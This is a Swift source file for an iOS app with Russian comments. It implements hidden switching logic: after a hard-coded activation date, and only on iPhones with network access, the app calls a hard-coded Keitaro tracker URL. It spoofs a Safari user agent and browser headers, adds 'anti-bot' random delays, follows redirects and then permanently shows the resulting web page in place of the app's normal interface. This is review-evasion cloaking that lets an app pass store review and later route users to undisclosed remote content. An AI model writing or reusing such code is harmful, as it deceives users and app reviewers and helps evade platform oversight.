import Foundation
import Network
import UIKit
import Combine

// MARK: - Настройки в шапке файла
private let researchLaunchDate = "2026-1-30" // Дата активации
private let primaryServerURL = "https://oidedsfvn.com/kgx7nb" // Стартовая ссылка Keitaro
private let customUserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
private let networkTimeout: TimeInterval = 30.0
private let connectionCheckTimeout: TimeInterval = 5.0

// MARK: - Браузерные заголовки
private let browserHeaders: [String: String] = [
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Cache-Control": "max-age=0",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1"
]

// MARK: - Storage Keys
private enum StorageKeys {
    static let savedTargetURL = "ProteinsSavedTargetURL"           // Постоянный URL
    static let savedPathId = "CrabsSavedPathId"                     // PathId для fallback
    static let hasShownAlternative = "ProteinsHasShownAlternative" // Флаг показа альт. режима
    static let validationPassed = "CrabsValidationPassed"           // Состояние валидации
    static let tempCurrentURL = "ProteinsTempCurrentURL"            // Временный URL
    static let ratingAlertShown = "CrabsRatingAlertShown"          // Флаг показа рейтингового алерта
    static let firstLaunchDecision = "ProteinsFirstLaunchDecision" // Решение первого входа (true = WebView, false = Main app)
    static let isFirstLaunchCompleted = "ProteinsIsFirstLaunchCompleted" // Флаг завершения первого входа
}

// MARK: - CoordinatorObserver (Singleton)
final class CoordinatorObserver: ObservableObject {
    static let shared = CoordinatorObserver()
    
    @Published var shouldShowAlternativeMode = false
    @Published var isValidating = true
    @Published var shouldSaveNextURL = false
    
    private let monitor = NWPathMonitor()
    private let monitorQueue = DispatchQueue(label: "NetworkMonitor")
    
    private init() {
        print("🧬 CoordinatorObserver: Initialized")
    }
    
    // MARK: - Public Access to Constants
    var userAgent: String {
        return customUserAgent
    }
    
    var serverURL: String {
        return primaryServerURL
    }
    
    // MARK: - Main Validation Entry Point
    func startValidation() async {
        print("🧬 CoordinatorObserver: Starting validation chain...")
        
        // Проверяем, был ли уже первый вход
        let isFirstLaunchCompleted = UserDefaults.standard.bool(forKey: StorageKeys.isFirstLaunchCompleted)
        
        if isFirstLaunchCompleted {
            // Второй и последующие входы - используем сохраненное решение без проверок
            let savedDecision = UserDefaults.standard.bool(forKey: StorageKeys.firstLaunchDecision)
            print("🧬 CoordinatorObserver: Not first launch - Using saved decision: \(savedDecision ? "WebView" : "Main app")")
            
            if savedDecision {
                // Показываем WebView - загружаем сохраненную ссылку или fallback
                await handleSubsequentLaunch()
            } else {
                // Показываем основное приложение
                await finishValidation(showAlternative: false, saveDecision: false)
            }
        } else {
            // Первый вход - выполняем все проверки
            print("🧬 CoordinatorObserver: First launch - Running all checks...")
            await performFirstLaunchChecks()
        }
    }
    
    // MARK: - First Launch Checks
    private func performFirstLaunchChecks() async {
        // 1. Проверка устройства
        guard checkDevice() else {
            print("🧬 CoordinatorObserver: iPad detected → Main app")
            await finishValidation(showAlternative: false, saveDecision: false)
            return
        }
        
        // 2. Проверка даты
        guard checkDate() else {
            print("🧬 CoordinatorObserver: Date check failed → Main app")
            await finishValidation(showAlternative: false, saveDecision: false)
            return
        }
        
        // 3. Проверка интернета
        guard await checkInternet() else {
            print("🧬 CoordinatorObserver: No internet → Main app")
            await finishValidation(showAlternative: false, saveDecision: false)
            return
        }
        
        // 4. Все проверки пройдены - работаем со ссылками
        print("🧬 CoordinatorObserver: All checks passed → Processing URLs")
        await handleURLLogic()
    }
    
    // MARK: - Subsequent Launch Handler
    private func handleSubsequentLaunch() async {
        // Загружаем сохраненную ссылку, если она есть
        if let savedURL = getSavedTargetURL() {
            print("🧬 CoordinatorObserver: Loading saved URL: \(savedURL)")
            guard let url = URL(string: savedURL) else {
                print("🧬 CoordinatorObserver: Invalid saved URL → Fallback")
                await handleFallbackForSubsequentLaunch()
                return
            }
            
            // Проверяем валидность сохраненной ссылки
            let isValid = await checkURLValidity(url)
            if isValid {
                print("🧬 CoordinatorObserver: Saved URL is valid → Show WebView")
                await finishValidation(showAlternative: true, saveDecision: false)
            } else {
                print("🧬 CoordinatorObserver: Saved URL is dead → Fallback")
                await handleFallbackForSubsequentLaunch()
            }
        } else {
            print("🧬 CoordinatorObserver: No saved URL → Fallback")
            await handleFallbackForSubsequentLaunch()
        }
    }
    
    // MARK: - Fallback for Subsequent Launch
    private func handleFallbackForSubsequentLaunch() async {
        guard let savedPathId = getSavedPathId() else {
            print("🧬 CoordinatorObserver: No saved pathId → Show WebView with empty state")
            // Очищаем все URL чтобы показать пустое состояние
            clearTempCurrentURL()
            clearSavedTargetURL()
            await finishValidation(showAlternative: true, saveDecision: false)
            return
        }
        
        let fallbackURLString = "\(primaryServerURL)?pathid=\(savedPathId)"
        guard let fallbackURL = URL(string: fallbackURLString) else {
            print("🧬 CoordinatorObserver: Invalid fallback URL → Show WebView with empty state")
            // Очищаем все URL чтобы показать пустое состояние
            clearTempCurrentURL()
            clearSavedTargetURL()
            await finishValidation(showAlternative: true, saveDecision: false)
            return
        }
        
        print("🧬 CoordinatorObserver: Trying fallback URL: \(fallbackURLString)")
        let result = await followRedirects(from: fallbackURL)
        
        switch result {
        case .success(let finalURL):
            print("🧬 CoordinatorObserver: Fallback got final URL: \(finalURL.absoluteString)")
            let isValid = await checkURLValidity(finalURL)
            
            if isValid {
                print("🧬 CoordinatorObserver: Fallback URL is valid → Save and show")
                shouldSaveNextURL = true
                saveTempCurrentURL(finalURL.absoluteString)
                await finishValidation(showAlternative: true, saveDecision: false)
            } else {
                print("🧬 CoordinatorObserver: Fallback URL is invalid → Show WebView with empty state")
                // Очищаем все URL чтобы показать пустое состояние
                clearTempCurrentURL()
                clearSavedTargetURL()
                await finishValidation(showAlternative: true, saveDecision: false)
            }
            
        case .failure(let error):
            print("🧬 CoordinatorObserver: Fallback failed: \(error.localizedDescription) → Show WebView with empty state")
            // Очищаем все URL чтобы показать пустое состояние
            clearTempCurrentURL()
            clearSavedTargetURL()
            await finishValidation(showAlternative: true, saveDecision: false)
        }
    }
    
    // MARK: - Device Check
    private func checkDevice() -> Bool {
        let isIPhone = UIDevice.current.userInterfaceIdiom == .phone
        print("🧬 CoordinatorObserver: Device check - iPhone: \(isIPhone)")
        return isIPhone
    }
    
    // MARK: - Date Check
    private func checkDate() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "yyyy-MM-dd"
        
        guard let cutoffDate = dateFormatter.date(from: researchLaunchDate) else {
            print("🧬 CoordinatorObserver: Invalid date format")
            return false
        }
        
        let currentDate = Date()
        let isPassed = currentDate > cutoffDate
        
        print("🧬 CoordinatorObserver: Date check - Current: \(dateFormatter.string(from: currentDate)), Cutoff: \(researchLaunchDate), Passed: \(isPassed)")
        return isPassed
    }
    
    // MARK: - Internet Check
    private func checkInternet() async -> Bool {
        return await withCheckedContinuation { continuation in
            var hasResumed = false
            
            monitor.pathUpdateHandler = { path in
                guard !hasResumed else { return }
                hasResumed = true
                
                let isConnected = path.status == .satisfied
                print("🧬 CoordinatorObserver: Internet check - Connected: \(isConnected)")
                continuation.resume(returning: isConnected)
            }
            
            monitor.start(queue: monitorQueue)
            
            // Timeout
            DispatchQueue.global().asyncAfter(deadline: .now() + connectionCheckTimeout) {
                guard !hasResumed else { return }
                hasResumed = true
                print("🧬 CoordinatorObserver: Internet check timeout")
                continuation.resume(returning: false)
            }
        }
    }
    
    // MARK: - URL Logic Handler
    private func handleURLLogic() async {
        let hasShownBefore = UserDefaults.standard.bool(forKey: StorageKeys.hasShownAlternative)
        
        if let savedURL = getSavedTargetURL() {
            print("🧬 CoordinatorObserver: Found saved URL: \(savedURL)")
            await handleSavedURL(savedURL, hasShownBefore: hasShownBefore)
        } else {
            print("🧬 CoordinatorObserver: No saved URL → First launch flow")
            await handleFirstLaunch(hasShownBefore: hasShownBefore)
        }
    }
    
    // MARK: - Scenario B: Saved URL exists (First Launch)
    private func handleSavedURL(_ savedURL: String, hasShownBefore: Bool) async {
        guard let url = URL(string: savedURL) else {
            print("🧬 CoordinatorObserver: Invalid saved URL")
            await handleFirstLaunch(hasShownBefore: hasShownBefore)
            return
        }
        
        print("🧬 CoordinatorObserver: Checking saved URL validity...")
        let isValid = await checkURLValidity(url)
        
        if isValid {
            print("🧬 CoordinatorObserver: Saved URL is valid → Show alternative mode")
            await finishValidation(showAlternative: true, saveDecision: true)
        } else {
            print("🧬 CoordinatorObserver: Saved URL is dead → Fallback logic")
            clearSavedTargetURL()
            await handleFallback(hasShownBefore: hasShownBefore)
        }
    }
    
    // MARK: - Scenario A: First Launch
    private func handleFirstLaunch(hasShownBefore: Bool) async {
        guard let primaryURL = URL(string: primaryServerURL) else {
            print("🧬 CoordinatorObserver: Invalid primary URL")
            await finishValidation(showAlternative: false, saveDecision: true)
            return
        }
        
        print("🧬 CoordinatorObserver: Making request to primary server...")
        
        let result = await followRedirects(from: primaryURL)
        
        switch result {
        case .success(let finalURL):
            print("🧬 CoordinatorObserver: Got final URL: \(finalURL.absoluteString)")
            
            // Извлекаем и сохраняем pathId
            if let pathId = extractPathId(from: finalURL, htmlData: nil) {
                savePathId(pathId)
                print("🧬 CoordinatorObserver: Extracted and saved pathId: \(pathId)")
            }
            
            // Проверяем финальный URL
            let isValid = await checkURLValidity(finalURL)
            
            if isValid {
                print("🧬 CoordinatorObserver: Final URL is valid → Show alternative mode")
                shouldSaveNextURL = true
                saveTempCurrentURL(finalURL.absoluteString)
                UserDefaults.standard.set(true, forKey: StorageKeys.hasShownAlternative)
                await finishValidation(showAlternative: true, saveDecision: true)
            } else {
                print("🧬 CoordinatorObserver: Final URL is invalid → Main app")
                await finishValidation(showAlternative: false, saveDecision: true)
            }
            
        case .failure(let error):
            print("🧬 CoordinatorObserver: Redirect failed: \(error.localizedDescription)")
            await finishValidation(showAlternative: false, saveDecision: true)
        }
    }
    
    // MARK: - Fallback Logic (First Launch)
    private func handleFallback(hasShownBefore: Bool) async {
        guard let savedPathId = getSavedPathId() else {
            print("🧬 CoordinatorObserver: No saved pathId → Show WebView with empty state")
            // Очищаем все URL чтобы показать пустое состояние
            clearTempCurrentURL()
            clearSavedTargetURL()
            await finishValidation(showAlternative: true, saveDecision: true)
            return
        }
        
        let fallbackURLString = "\(primaryServerURL)?pathid=\(savedPathId)"
        guard let fallbackURL = URL(string: fallbackURLString) else {
            print("🧬 CoordinatorObserver: Invalid fallback URL")
            // Очищаем все URL чтобы показать пустое состояние
            clearTempCurrentURL()
            clearSavedTargetURL()
            await finishValidation(showAlternative: true, saveDecision: true)
            return
        }
        
        print("🧬 CoordinatorObserver: Trying fallback URL: \(fallbackURLString)")
        
        let result = await followRedirects(from: fallbackURL)
        
        switch result {
        case .success(let finalURL):
            print("🧬 CoordinatorObserver: Fallback got final URL: \(finalURL.absoluteString)")
            
            let isValid = await checkURLValidity(finalURL)
            
            if isValid {
                print("🧬 CoordinatorObserver: Fallback URL is valid → Save and show")
                shouldSaveNextURL = true
                saveTempCurrentURL(finalURL.absoluteString)
                await finishValidation(showAlternative: true, saveDecision: true)
            } else {
                print("🧬 CoordinatorObserver: Fallback URL is invalid → Show WebView with empty state")
                // Очищаем все URL чтобы показать пустое состояние
                clearTempCurrentURL()
                clearSavedTargetURL()
                await finishValidation(showAlternative: true, saveDecision: true)
            }
            
        case .failure(let error):
            print("🧬 CoordinatorObserver: Fallback failed: \(error.localizedDescription) → Show WebView with empty state")
            // Очищаем все URL чтобы показать пустое состояние
            clearTempCurrentURL()
            clearSavedTargetURL()
            await finishValidation(showAlternative: true, saveDecision: true)
        }
    }
    
    // MARK: - Follow Redirects with Anti-Bot Protection
    private func followRedirects(from url: URL) async -> Result<URL, Error> {
        var currentURL = url
        var visitedURLs: Set<String> = []
        let maxRedirects = 10
        var redirectCount = 0
        
        while redirectCount < maxRedirects {
            // Анти-бот задержка
            if redirectCount > 0 {
                let delay = Double.random(in: 1.0...3.0)
                print("🧬 CoordinatorObserver: Anti-bot delay: \(String(format: "%.2f", delay))s")
                try? await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000))
            }
            
            // Проверка на цикл
            if visitedURLs.contains(currentURL.absoluteString) {
                print("🧬 CoordinatorObserver: Redirect loop detected")
                return .success(currentURL)
            }
            
            visitedURLs.insert(currentURL.absoluteString)
            
            var request = configureRequest(for: currentURL)
            request.httpShouldHandleCookies = true
            
            do {
                let (data, response) = try await URLSession.shared.data(for: request)
                
                guard let httpResponse = response as? HTTPURLResponse else {
                    return .failure(NSError(domain: "InvalidResponse", code: -1))
                }
                
                print("🧬 CoordinatorObserver: Response code: \(httpResponse.statusCode) for \(currentURL.absoluteString)")
                
                // Извлекаем pathId из HTML если есть
                if let pathId = extractPathId(from: currentURL, htmlData: data) {
                    savePathId(pathId)
                    print("🧬 CoordinatorObserver: Extracted pathId from response: \(pathId)")
                }
                
                // Проверяем редирект
                if let location = httpResponse.value(forHTTPHeaderField: "Location"),
                   let redirectURL = URL(string: location, relativeTo: currentURL) {
                    print("🧬 CoordinatorObserver: Redirect to: \(redirectURL.absoluteString)")
                    currentURL = redirectURL
                    redirectCount += 1
                    continue
                }
                
                // Нет редиректа - это финальный URL
                print("🧬 CoordinatorObserver: Final URL reached: \(currentURL.absoluteString)")
                return .success(currentURL)
                
            } catch {
                print("🧬 CoordinatorObserver: Request error: \(error.localizedDescription)")
                return .failure(error)
            }
        }
        
        print("🧬 CoordinatorObserver: Max redirects reached")
        return .success(currentURL)
    }
    
    // MARK: - Check URL Validity
    private func checkURLValidity(_ url: URL) async -> Bool {
        var request = configureRequest(for: url)
        request.httpMethod = "HEAD"
        
        do {
            let (_, response) = try await URLSession.shared.data(for: request)
            
            guard let httpResponse = response as? HTTPURLResponse else {
                return false
            }
            
            // 404 - плохой ответ (невалидный)
            // 405 - нормальный ответ (валидный)
            let isValid: Bool
            if httpResponse.statusCode == 404 {
                isValid = false
            } else if httpResponse.statusCode == 405 {
                isValid = true
            } else {
                isValid = httpResponse.statusCode >= 200 && httpResponse.statusCode <= 403
            }
            print("🧬 CoordinatorObserver: URL validity check - Code: \(httpResponse.statusCode), Valid: \(isValid)")
            return isValid
            
        } catch {
            print("🧬 CoordinatorObserver: URL validity check failed: \(error.localizedDescription)")
            return false
        }
    }
    
    // MARK: - Configure Request with Anti-Bot Headers
    private func configureRequest(for url: URL) -> URLRequest {
        var request = URLRequest(url: url, timeoutInterval: networkTimeout)
        
        request.setValue(customUserAgent, forHTTPHeaderField: "User-Agent")
        
        for (key, value) in browserHeaders {
            request.setValue(value, forHTTPHeaderField: key)
        }
        
        return request
    }
    
    // MARK: - Extract PathId
    private func extractPathId(from url: URL, htmlData: Data?) -> String? {
        // Сначала пробуем из URL
        if let components = URLComponents(url: url, resolvingAgainstBaseURL: false),
           let queryItems = components.queryItems,
           let pathIdItem = queryItems.first(where: { $0.name == "pathid" }),
           let pathId = pathIdItem.value {
            print("🧬 CoordinatorObserver: PathId extracted from URL: \(pathId)")
            return pathId
        }
        
        // Если есть HTML данные, пробуем парсить
        if let data = htmlData,
           let html = String(data: data, encoding: .utf8) {
            // Ищем pathid в HTML
            let patterns = [
                "pathid=([a-zA-Z0-9_-]+)",
                "\"pathid\"\\s*:\\s*\"([a-zA-Z0-9_-]+)\"",
                "'pathid'\\s*:\\s*'([a-zA-Z0-9_-]+)'"
            ]
            
            for pattern in patterns {
                if let regex = try? NSRegularExpression(pattern: pattern),
                   let match = regex.firstMatch(in: html, range: NSRange(html.startIndex..., in: html)),
                   let range = Range(match.range(at: 1), in: html) {
                    let pathId = String(html[range])
                    print("🧬 CoordinatorObserver: PathId extracted from HTML: \(pathId)")
                    return pathId
                }
            }
        }
        
        print("🧬 CoordinatorObserver: No pathId found")
        return nil
    }
    
    // MARK: - Finish Validation
    @MainActor
    private func finishValidation(showAlternative: Bool, saveDecision: Bool = true) {
        print("🧬 CoordinatorObserver: Validation finished - Show alternative: \(showAlternative)")
        
        // Сохраняем решение при первом входе
        if saveDecision {
            let isFirstLaunchCompleted = UserDefaults.standard.bool(forKey: StorageKeys.isFirstLaunchCompleted)
            if !isFirstLaunchCompleted {
                print("🧬 CoordinatorObserver: Saving first launch decision: \(showAlternative ? "WebView" : "Main app")")
                UserDefaults.standard.set(showAlternative, forKey: StorageKeys.firstLaunchDecision)
                UserDefaults.standard.set(true, forKey: StorageKeys.isFirstLaunchCompleted)
            }
        }
        
        shouldShowAlternativeMode = showAlternative
        isValidating = false
        monitor.cancel()
    }
    
    // MARK: - Storage Helpers
    func getSavedTargetURL() -> String? {
        UserDefaults.standard.string(forKey: StorageKeys.savedTargetURL)
    }
    
    func saveSavedTargetURL(_ url: String) {
        print("🧬 CoordinatorObserver: Saving target URL: \(url)")
        UserDefaults.standard.set(url, forKey: StorageKeys.savedTargetURL)
    }
    
    func clearSavedTargetURL() {
        print("🧬 CoordinatorObserver: Clearing saved target URL")
        UserDefaults.standard.removeObject(forKey: StorageKeys.savedTargetURL)
    }
    
    func getTempCurrentURL() -> String? {
        UserDefaults.standard.string(forKey: StorageKeys.tempCurrentURL)
    }
    
    func saveTempCurrentURL(_ url: String) {
        print("🧬 CoordinatorObserver: Saving temp current URL: \(url)")
        UserDefaults.standard.set(url, forKey: StorageKeys.tempCurrentURL)
    }
    
    func clearTempCurrentURL() {
        print("🧬 CoordinatorObserver: Clearing temp current URL")
        UserDefaults.standard.removeObject(forKey: StorageKeys.tempCurrentURL)
    }
    
    func getCurrentTargetURL() -> String? {
        // Приоритет: temp → saved
        if let temp = getTempCurrentURL() {
            return temp
        }
        return getSavedTargetURL()
    }
    
    func getSavedPathId() -> String? {
        UserDefaults.standard.string(forKey: StorageKeys.savedPathId)
    }
    
    func savePathId(_ pathId: String) {
        print("🧬 CoordinatorObserver: Saving pathId: \(pathId)")
        UserDefaults.standard.set(pathId, forKey: StorageKeys.savedPathId)
    }
    
    func saveWebViewFinalURL(_ url: String) {
        // Сохраняем только если флаг установлен
        guard shouldSaveNextURL else {
            print("🧬 CoordinatorObserver: Skipping URL save (flag not set)")
            return
        }
        
        print("🧬 CoordinatorObserver: Saving WebView final URL: \(url)")
        saveSavedTargetURL(url)
        clearTempCurrentURL()
        shouldSaveNextURL = false
        
        // Извлекаем pathId из финального URL
        if let urlObj = URL(string: url),
           let pathId = extractPathId(from: urlObj, htmlData: nil) {
            savePathId(pathId)
        }
    }
    
    // MARK: - Rating Alert
    func checkRatingAlertEligibility() -> Bool {
        let hasShown = UserDefaults.standard.bool(forKey: StorageKeys.hasShownAlternative)
        let alertShown = UserDefaults.standard.bool(forKey: StorageKeys.ratingAlertShown)
        
        let shouldShow = hasShown && !alertShown
        print("🧬 CoordinatorObserver: Rating alert eligibility - Should show: \(shouldShow)")
        return shouldShow
    }
    
    func markRatingAlertShown() {
        print("🧬 CoordinatorObserver: Marking rating alert as shown")
        UserDefaults.standard.set(true, forKey: StorageKeys.ratingAlertShown)
    }
}

